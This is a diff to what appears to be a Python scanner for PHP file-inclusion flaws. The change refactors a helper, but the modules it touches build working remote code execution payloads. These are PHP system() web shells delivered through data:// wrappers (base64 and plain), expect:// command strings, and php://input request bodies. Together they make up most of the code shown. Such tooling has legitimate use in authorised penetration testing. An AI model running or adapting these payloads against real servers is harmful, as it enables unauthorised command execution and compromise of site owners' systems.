@@ -16,7 +16,7 @@ import base64
 from collections.abc import Iterator
 
 from ..config import Encoding
-from ..detection import RCE_MARKER
+from ..detection import RCE_MARKER, cmd_with_marker
 from ..http_client import HttpClient, Response
 from ..detection import Finding
 from .base import BaseModule
@@ -24,11 +24,6 @@ from .base import BaseModule
 
 def _b64(s: str) -> str:
     return base64.b64encode(s.encode()).decode()
-
-
-# Command that always emits the marker (echo) plus the real cfg.cmd output on Linux.
-def _cmd_with_marker(cmd: str) -> str:
-    return f"echo {RCE_MARKER}; {cmd}"
 
 
 class FilterReadModule(BaseModule):
@@ -62,7 +57,7 @@ class DataWrapperModule(BaseModule):
     description = "data://text/plain;base64 — RCE (allow_url_include)"
 
     def payloads(self) -> Iterator[str]:
-        php = f"<?php system('{_cmd_with_marker(self.cfg.cmd)}'); ?>"
+        php = f"<?php system('{cmd_with_marker(self.cfg.cmd)}'); ?>"
         b64 = _b64(php)
         yield f"data://text/plain;base64,{b64}"
         yield f"data://text/plain,{php}"
@@ -74,7 +69,7 @@ class ExpectWrapperModule(BaseModule):
     description = "expect:// — direct command execution"
 
     def payloads(self) -> Iterator[str]:
-        yield f"expect://{_cmd_with_marker(self.cfg.cmd)}"
+        yield f"expect://{cmd_with_marker(self.cfg.cmd)}"
 
 
 class InputWrapperModule(BaseModule):
@@ -92,7 +87,7 @@ class InputWrapperModule(BaseModule):
 
     async def run(self, client: HttpClient) -> list[Finding]:
         # Hardcode the command in the payload (not every target reads GET).
-        php = f"<?php system('{_cmd_with_marker(self.cfg.cmd)}'); ?>"
+        php = f"<?php system('{cmd_with_marker(self.cfg.cmd)}'); ?>"
         # Temporarily swap the body for the web shell.
         orig_data, orig_method = client.cfg.data, client.cfg.method
         client.cfg.data = php
